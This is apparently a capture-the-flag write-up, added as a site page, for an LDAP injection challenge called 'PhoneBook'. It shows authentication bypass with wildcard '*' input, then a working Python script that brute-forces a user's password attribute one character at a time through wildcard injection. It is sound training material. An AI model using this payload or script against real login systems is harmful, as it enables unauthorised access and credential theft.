@@ -1,0 +1,96 @@
+---
+title: PhoneBook
+description: LDAP Injection challenge
+---
+import { Tabs, TabItem } from '@astrojs/starlight/components';
+
+
+In this challenge, we are presented with a web application that allows users to search for records containing names, email addresses, and phone numbers.
+
+On the login page, we immediately notice a potential username, `reese`, along with branding that strongly suggests the application is a phonebook service. Since phonebook applications commonly rely on LDAP for storing and querying user information, LDAP becomes a likely backend technology.
+
+```text
+New (9.8.2020): You can now login using the workstation username and password! - Reese
+```
+
+To test for LDAP injection, we use the universal wildcard payload `*` in both the username and password fields. The application successfully authenticates us, confirming that the login functionality is vulnerable to LDAP injection.
+
+Once authenticated, we can browse the phonebook and query information stored in the LDAP directory. Among the listed users, we find the previously mentioned account `reese`, along with its associated name, email address, and phone number.
+
+Since the challenge description states that the flag is hidden somewhere within the phonebook, our next objective is to enumerate additional LDAP attributes associated with this user.
+
+Although the application only displays a limited set of attributes, LDAP entries often contain many more fields, such as `description`, `title`, `department`, and others. Given that the application relies on LDAP for authentication and user management, it is reasonable to assume that the flag may be stored in one of these non-displayed attributes.
+
+A common LDAP misconfiguration is the storage of sensitive information within the `description` attribute, which is frequently overlooked during security reviews. However, instead of starting with `description`, we attempt to enumerate the `password` attribute, as it is a more sensitive field and therefore a likely candidate for containing the flag.
+
+--- 
+
+### POC
+
+To automate the extraction, we brute-force the `password` attribute one character at a time using LDAP wildcard matching.
+
+For each position, the script tests a candidate character by sending a payload of the form:
+
+```text id="8j7s1q"
+reese&password=<known_prefix><candidate_char>*
+```
+
+A successful login indicates that the password starts with the supplied prefix, confirming the character as correct. By repeating this process and extending the prefix character by character, the entire flag stored in the `password` attribute can be recovered.
+
+
+<Tabs syncKey="pkg">
+  <TabItem label="Python">
+
+```python
+#!/usr/bin/python3
+
+import requests
+import string
+
+url = "http://X.X.X.X:PORT/login"
+
+charset = string.ascii_letters + string.digits + "!@#$%^&-_=+[]{}|;:',.<>/`~\"\\"
+
+password = ""
+position = 0
+
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+print("[+] Fetching password ....")
+while not password.endswith("}"):
+    found_char = False
+    for char in charset:
+        injected_payload = f"reese&password={password + char}*"
+        payload = f"username={injected_payload}"
+
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+        response = requests.post(
+            url, data=payload, headers=headers, proxies=proxies, allow_redirects=False
+        )
+
+        if response.status_code == 302 and "Set-Cookie" in response.headers:
+            password += char
+            position += 1
+            found_char = True
+            print(
+                f"Found char at position {position - 1}: {char} (password so far: {password})"
+            )
+            break
+
+    if not found_char:
+        print("No matching character found at this position. Exiting.")
+        break
+
+print(f"Final extracted password: {password}")
+
+```
+  </TabItem>
+</Tabs>
+
+--- 
+
+### Resources
+
+- https://owasp.org/www-community/attacks/LDAP_Injection
+- https://payloadplayground.com/blog/ldap-injection-exploitation-guide
